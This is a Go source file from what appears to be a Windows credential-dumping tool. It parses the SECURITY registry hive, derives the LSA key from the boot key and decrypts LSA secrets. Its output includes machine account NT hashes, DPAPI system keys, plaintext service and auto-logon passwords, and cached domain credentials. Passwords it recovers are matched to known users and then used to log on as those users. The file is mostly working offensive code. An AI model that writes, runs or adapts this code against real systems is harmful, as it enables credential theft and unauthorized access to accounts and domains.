package main

import (
	"encoding/binary"
	"fmt"
	"strings"
)

func parseSECURITY(data []byte, bootKey []byte, domainName string, isDomainJoined bool) {
	hive, err := parseHive(data)
	if err != nil {
		fmt.Printf("[+] failed to parse security hive\n")
		return
	}

	_, err = hive.ReadNKRecord(hive.RootCellIndex)
	if err != nil {
		fmt.Printf("[+] failed to read root key\n")
		return
	}

	lsaKey := extractLSAKeyFromSecurity(hive, bootKey)
	if lsaKey == nil {
		fmt.Printf("[+] failed to extract lsa key from security hive, using boot key fallback\n")
		lsaKey = bootKey
	}

	secretsKey, err := hive.FindKey("Policy\\Secrets")
	if err != nil {
		return
	}

	fmt.Println("\n╔════════════════════════════════════════════════════════════╗")
	fmt.Println("║                       lsa secrets                          ║")
	fmt.Println("╚════════════════════════════════════════════════════════════╝")

	subkeys := hive.GetSubkeys(secretsKey)
	fmt.Printf("\n[+] found %d secret entries\n", len(subkeys))

	for _, secretKey := range subkeys {
		secretName := secretKey.Name
		currValKey, err := hive.FindKey("Policy\\Secrets\\" + secretName + "\\CurrVal")
		if err != nil {
			fmt.Printf("    [!] failed to find CurrVal key: %v\n", err)
			continue
		}

		values := hive.GetValues(currValKey)
		var encryptedSecret []byte

		for _, vk := range values {
			if len(vk.Data) > 0 && encryptedSecret == nil {
				encryptedSecret = vk.Data
				break
			}
		}

		if encryptedSecret == nil || len(encryptedSecret) < 28 {
			continue
		}

		secretData := decryptLSASecret(encryptedSecret, lsaKey)
		if secretData == nil || len(secretData) == 0 {
			continue
		}

		displaySecret(secretName, secretData, domainName, isDomainJoined)
	}
}

func decryptLSASecret(encryptedSecret []byte, lsaKey []byte) []byte {
	if len(encryptedSecret) < 28 {
		return nil
	}

	encryptedData := encryptedSecret[28:]

	if len(encryptedData) < 32 {
		return nil
	}

	salt := encryptedData[:32]
	cipherText := encryptedData[32:]

	derivedKey := deriveSHA256Key(lsaKey, salt)

	key32 := derivedKey[:32]
	zeroIV := make([]byte, 16)
	decrypted := decryptAES(key32, zeroIV, cipherText)

	if decrypted != nil && len(decrypted) >= 16 {
		secretLength := binary.LittleEndian.Uint32(decrypted[0:4])

		if secretLength > 0 && secretLength < 10000 && int(secretLength) <= len(decrypted)-16 {

		} else {
			key16 := derivedKey[:16]
			decrypted = decryptAES(key16, zeroIV, cipherText)
		}
	}

	if decrypted == nil {
		return nil
	}

	if len(decrypted) < 16 {
		return nil
	}

	secretLength := binary.LittleEndian.Uint32(decrypted[0:4])
	if secretLength == 0 || int(secretLength) > len(decrypted)-16 {
		return nil
	}

	secret := decrypted[16 : 16+secretLength]
	return secret
}

func displaySecret(name string, data []byte, domainName string, isDomainJoined bool) {
	fmt.Printf("\n[+] secret: %s\n", name)

	if strings.HasPrefix(name, "$MACHINE.ACC") {
		fmt.Printf("    type: machine account password\n")
		if len(data) > 0 {
			if len(data) >= 20 {
				var ntHash []byte
				var password string
				if len(data) >= 16 {
					possibleOffsets := []int{0, 4, 16, 20}
					
					for _, offset := range possibleOffsets {
						if offset+16 <= len(data) {
							candidate := data[offset : offset+16]
							if !isAllZero(candidate) && !isAllSame(candidate) {
								ntHash = candidate
								pwdOffset := offset + 16
								if pwdOffset < len(data) {
									password = utf16ToString(data[pwdOffset:])
								}
								break
							}
						}
					}
				}
				
				if ntHash != nil {
					fmt.Printf("    nt_hash: %x\n", ntHash)
				}
				if password != "" && len(password) < 100 {
					fmt.Printf("    plaintext: %s\n", password)
				}
			}
		}
	} else if strings.HasPrefix(name, "DPAPI_SYSTEM") {
		fmt.Printf("    type: dpapi system key\n")
		if len(data) >= 44 {
			machineKey := data[4:24]
			userKey := data[24:44]
			fmt.Printf("    dpapi_machinekey: %x\n", machineKey)
			fmt.Printf("    dpapi_userkey: %x\n", userKey)
		} else {
			fmt.Printf("    data: ")
			for i := 0; i < len(data) && i < 40; i++ {
				fmt.Printf("%02x", data[i])
			}
			fmt.Printf("\n")
		}
	} else if strings.HasPrefix(name, "_SC_") {
		serviceName := strings.TrimPrefix(name, "_SC_")
		fmt.Printf("    type: service account password (%s)\n", serviceName)
		if len(data) > 0 {
			password := utf16ToString(data)
			if password != "" {
				fmt.Printf("    password: %s\n", password)
				var matchedCredential *UserCredential
				if extractedCredentials != nil {

					for _, credential := range extractedCredentials {
						username := strings.ToLower(credential.Username)
						service := strings.ToLower(serviceName)
						if username == service ||
							strings.Contains(service, username) ||
							strings.Contains(username, service) {
							matchedCredential = credential
							break
						}
					}

					if matchedCredential != nil {
						matchedCredential.Password = password
						fmt.Printf("    matched user: %s\n\n", matchedCredential.Username)
						if isDomainJoined {
							logonUserDomainJoined(matchedCredential.Username, password, domainName)
						} else {
							logonUserNonDomainJoined(matchedCredential.Username, password)
						}
					} else {
						fmt.Printf("    no matching user found for service: %s\n", serviceName)
					}
				}

				if isDomainJoined {
					fmt.Printf("    domain: %s (domain-joined)\n", domainName)
				} else {
					fmt.Printf("    domain: local (workgroup)\n")
				}
			}
		}
	} else if strings.HasPrefix(name, "DefaultPassword") {
		fmt.Printf("    type: auto-logon password\n")
		if len(data) > 0 {
			password := utf16ToString(data)
			if password != "" {
				fmt.Printf("    password: %s\n", password)
			}
		}
	} else if strings.HasPrefix(name, "NL$") {
		fmt.Printf("    type: cached domain credential\n")
		fmt.Printf("    data: ")
		for i := 0; i < len(data) && i < 32; i++ {
			fmt.Printf("%02x", data[i])
		}
		if len(data) > 32 {
			fmt.Printf("...")
		}
		fmt.Printf("\n")
	} else {
		fmt.Printf("    type: generic secret\n")
		if len(data) <= 64 {
			text := utf16ToString(data)
			if text != "" && isPrintable(text) {
				fmt.Printf("    text: %s\n", text)
			} else {
				fmt.Printf("    hex: ")
				for i := 0; i < len(data); i++ {
					fmt.Printf("%02x", data[i])
				}
				fmt.Printf("\n")
			}
		} else {
			fmt.Printf("    size: %d bytes\n", len(data))
		}
	}
}

func isPrintable(s string) bool {
	for _, r := range s {
		if r < 32 || r > 126 {
			if r != '\n' && r != '\r' && r != '\t' {
				return false
			}
		}
	}
	return true
}

func extractLSAKeyFromSecurity(hive *RegistryHive, bootKey []byte) []byte {
	polKeyNK, err := hive.FindKey("Policy\\PolEKList")
	if err != nil {
		polKeyNK, err = hive.FindKey("Policy\\PolSecretEncryptionKey")
		if err != nil {
			return nil
		}
	}

	var encryptedKey []byte

	if polKeyNK.SubkeyCount > 0 {
		subkeys := hive.GetSubkeys(polKeyNK)
		for _, sk := range subkeys {
			if sk.ValueCount > 0 {
				values := hive.GetValues(sk)
				for _, vk := range values {
					if len(vk.Data) >= 28 {
						encryptedKey = vk.Data
						break
					}
				}
				if encryptedKey != nil {
					break
				}
			}
		}
	}

	if encryptedKey == nil && polKeyNK.ValueCount > 0 {
		values := hive.GetValues(polKeyNK)
		for _, vk := range values {
			if len(vk.Data) >= 28 {
				encryptedKey = vk.Data
				break
			}
		}
	}

	if encryptedKey == nil || len(encryptedKey) < 28 {
		return nil
	}

	lsaKey := decryptLSAKeyData(encryptedKey, bootKey)

	if lsaKey != nil {
		fmt.Printf("[+] decrypted LSA key:")
		for i := 0; i < len(lsaKey); i++ {
			fmt.Printf("%02x", lsaKey[i])
		}
		fmt.Printf("\n\n")
	}

	return lsaKey
}

func isAllZero(data []byte) bool {
	for _, b := range data {
		if b != 0 {
			return false
		}
	}
	return true
}

func isAllSame(data []byte) bool {
	if len(data) == 0 {
		return true
	}
	first := data[0]
	for _, b := range data[1:] {
		if b != first {
			return false
		}
	}
	return true
}
